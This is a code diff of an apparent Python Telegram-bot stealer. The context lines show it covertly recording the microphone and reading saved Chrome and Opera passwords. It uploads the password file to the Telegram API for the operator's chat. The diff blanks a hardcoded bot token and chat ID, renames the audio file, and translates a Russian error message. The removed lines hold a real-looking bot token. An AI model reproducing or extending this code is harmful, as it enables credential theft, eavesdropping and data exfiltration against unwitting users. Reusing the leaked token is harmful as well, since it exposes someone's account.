@@ -15,8 +15,8 @@ import wave
 import pyaudio
 
 
-bot_token = "5052034048:AAG1uFc-7DmHxlDzYJGnRVOvXMc3uq7cQIA" # YOUR BOT TOKEN
-chat_id = "2119685434" # YOUR USER ID
+bot_token = " " # YOUR BOT TOKEN
+chat_id = " " # YOUR USER ID
 bot = telebot.TeleBot(bot_token)
 
 def Chrome():
@@ -44,7 +44,7 @@ def function():
     CHANNELS = 2
     RATE = 44100
     RECORD_SECONDS = 60
-    WAVE_OUTPUT_FILENAME = "record.wav"
+    WAVE_OUTPUT_FILENAME = "a45133b44db5bb.wav"
 
     p = pyaudio.PyAudio()
 
@@ -98,7 +98,7 @@ def send_passwords(message) :
             files = {'document': open(os.getenv("APPDATA") + '\\passwords_chrome.txt','rb')}
             requests.post("https://api.telegram.org/bot" + bot_token + "/sendDocument?chat_id=" + chat_id , files=files)
         except:
-            bot.send_message(chat_id, "Ошибка! Браузер запущен!")
+            bot.send_message(chat_id, "Error! Browser maybe not installed, otherwise try again!")
     elif ("{0}".format(message.text) == "/passwords opera") : # Else if text /passwords opera
             Opera()
             bot.send_message(chat_id, "Wait...")
